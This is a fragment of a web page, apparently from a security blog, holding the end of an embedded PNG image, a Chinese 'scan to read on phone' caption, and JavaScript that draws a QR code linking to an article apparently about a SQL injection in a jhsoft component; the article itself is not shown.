s+jE+N9R17Pxjr9CE6oLT9WyYK9gY+fuKW60N0CK78njcn6ovqojrM71P+YSAl3ut1J7ANBDI1eI6rrULq9GHk6iuE5CHYn6pVnblCSC0ErYHnvGr3C5KH4KpP1+2h3hHm/SA6cP+29/FmH9sb8mb7+r/dzv8AAAD//4rtd9AAAAAGSURBVAMAF/u8zvaRlnoAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AcceptGetSourceFileName-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 